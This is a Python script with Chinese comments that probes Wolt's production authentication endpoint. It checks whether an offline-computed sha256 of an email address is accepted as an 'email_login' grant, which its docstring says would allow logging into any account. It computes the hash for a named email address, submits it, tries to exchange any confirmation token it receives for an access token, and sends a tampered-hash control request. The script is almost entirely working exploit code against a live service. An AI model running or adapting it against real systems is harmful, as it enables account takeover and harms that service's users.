"""验证 wauth2 access_token 端点是否信任离线可算的 email_hash（sha256(email)）
信任链：email_hash 无密钥、确定性、可离线计算 -> 若 token 端点直接换 token = 任意账号登录
"""
import sys, json, requests, hashlib, base64, urllib.parse
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

AUTH = "https://authentication.wolt.com"
EMAIL = "pccp85811746@web-library.net"

def b64u(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")

# 离线计算 email_hash（不调接口）
h = b64u(hashlib.sha256(EMAIL.encode()).digest())
print(f"[1] offline email_hash: {h}")

# 用 /v3/users/email_login 确认一致性
r = requests.post(f"{AUTH}/v3/users/email_login", json={"email": EMAIL}, timeout=10,
                  headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
j = r.json()
print(f"[2] email_login api: {j}")

# ===== 直接提交 grant =====
print("\n[3] POST /v1/wauth2/access_token with email_login grant:")
body = urllib.parse.urlencode({
    "grantType": "email_login",
    "token": h,
    "audience": "wolt-com",
    "capabilities": "access_confirmation",
})
r = requests.post(f"{AUTH}/v1/wauth2/access_token", data=body, timeout=12,
                  headers={"Content-Type": "application/x-www-form-urlencoded",
                           "User-Agent": "Mozilla/5.0",
                           "Origin": "https://wolt.com"})
print(f"  HTTP {r.status_code}")
print(f"  {r.text[:600]}")

# 若返回 access_confirmation_token，再提交第二轮
try:
    j = r.json()
    act = j.get("access_confirmation_token")
    if act:
        print("\n[4] access_confirmation_token 拿到了，尝试直接换 token:")
        body2 = urllib.parse.urlencode({
            "grantType": "access_confirmation_token",
            "accessConfirmationToken": act,
            "audience": "wolt-com",
        })
        r2 = requests.post(f"{AUTH}/v1/wauth2/access_token", data=body2, timeout=12,
                           headers={"Content-Type": "application/x-www-form-urlencoded",
                                    "User-Agent": "Mozilla/5.0",
                                    "Origin": "https://wolt.com"})
        print(f"  HTTP {r2.status_code}")
        print(f"  {r2.text[:600]}")
except Exception as e:
    print(f"  parse err: {e}")

# ===== 关键对照：如果 hash 只差一个字节（错误 hash）会怎样 =====
print("\n[5] 对照：篡改 hash 最后 1 字符（应被拒绝才正常）:")
h_bad = h[:-1] + ("A" if h[-1] != "A" else "B")
r3 = requests.post(f"{AUTH}/v1/wauth2/access_token",
                   data=urllib.parse.urlencode({"grantType": "email_login", "token": h_bad,
                                                 "audience": "wolt-com",
                                                 "capabilities": "access_confirmation"}),
                   timeout=12,
                   headers={"Content-Type": "application/x-www-form-urlencoded",
                            "User-Agent": "Mozilla/5.0", "Origin": "https://wolt.com"})
print(f"  HTTP {r3.status_code}")
print(f"  {r3.text[:300]}")
